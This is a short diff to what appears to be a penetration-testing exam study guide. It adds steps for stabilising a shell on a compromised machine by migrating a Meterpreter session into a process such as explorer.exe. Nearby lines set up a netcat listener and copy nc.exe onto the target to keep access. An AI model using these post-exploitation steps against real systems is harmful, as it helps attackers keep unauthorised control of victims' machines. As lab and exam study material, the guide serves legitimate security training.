@@ -700,6 +700,11 @@ $ wine exploit.exe
 
 __Maintaining access to a box with unstable shell__
 
+METHOD: Meterpreter __########### WARNING: METERPRETER IS RESTRICTED IN THE EXAM ###########__
+1. `meterpreter> ps`: Find all running processes on the box.
+2. `meterpreter> migrate [pid]`: Migrate your unstable shell to another process e.g. `explorer.exe`.
+3. Your shell should be stable now.
+
 METHOD: Transfer netcat
 1. Set up listener on attacker box `nc -nvlp 4444`.
 2. Transfer nc/nc.exe to /temp or a dir with write privileges.
